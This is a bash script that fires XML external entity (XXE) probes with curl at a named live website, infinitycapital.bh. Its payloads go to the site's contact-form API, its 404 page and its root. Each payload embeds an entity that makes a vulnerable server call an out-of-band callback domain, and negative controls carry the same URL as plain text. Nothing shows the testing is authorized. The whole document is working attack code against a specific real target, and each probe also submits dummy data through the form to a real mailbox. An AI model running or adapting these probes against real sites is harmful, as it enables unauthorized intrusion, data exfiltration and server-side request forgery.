#!/bin/bash
H="https://www.infinitycapital.bh"
UAB='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36'
REAL=ooba5a8fe8da0fd.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
NEG=oob95818ca1c90f.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in

echo "### CONTROL A: real XXE doc posted to /api/send (server parses XML?)"
curl -s -A "$UAB" -X POST "$H/api/send" --max-time 25 \
  -F 'fname=A' -F 'lname=B' -F 'areacode=973' -F 'tel=3000000' -F 'cname=A' \
  -F 'subject=ICMARKER9' -F "msg=<!DOCTYPE r [<!ENTITY x SYSTEM \"http://$REAL/xxe\">]><r>&x;</r>" \
  -F 'check=true' -F 'targets=info@infinitycapital.bh' | head -c 250; echo

echo "### CONTROL B: NEGATIVE - same OOB URL as inert plain text, never parsed"
curl -s -A "$UAB" -X POST "$H/api/send" --max-time 25 \
  -F 'fname=A' -F 'lname=B' -F 'areacode=973' -F 'tel=3000000' -F 'cname=A' \
  -F 'subject=ICMARKER9' -F "msg=plain text http://$NEG/xxe nothing parses this" \
  -F 'check=true' -F 'targets=info@infinitycapital.bh' | head -c 250; echo

echo "### CONTROL C: real XXE doc to /404  (prior claim: XXE here via GET)"
curl -s -A "$UAB" -X POST "$H/404" --max-time 25 \
  --data-binary "<!DOCTYPE r [<!ENTITY x SYSTEM \"http://$REAL/xxe404\">]><r>&x;</r>" \
  -H 'Content-Type: application/xml' -w "\nHTTP:%{http_code}\n" | head -c 250; echo

echo "### CONTROL D: NEGATIVE - inert URL to /404 as query only (no parse path)"
curl -s -A "$UAB" -X GET "$H/404?q=plain%20http://$NEG/xxe404" --max-time 25 -o /dev/null -w "HTTP:%{http_code} SIZE:%{size_download}\n"

echo "### CONTROL E: real XXE doc to / (root) - does ANY xml parse exist?"
curl -s -A "$UAB" -X POST "$H/" --max-time 25 \
  --data-binary "<!DOCTYPE r [<!ENTITY x SYSTEM \"http://$REAL/xxeroot\">]><r>&x;</r>" \
  -H 'Content-Type: application/xml' -o /dev/null -w "HTTP:%{http_code} SIZE:%{size_download}\n"
echo FIRED_ALL
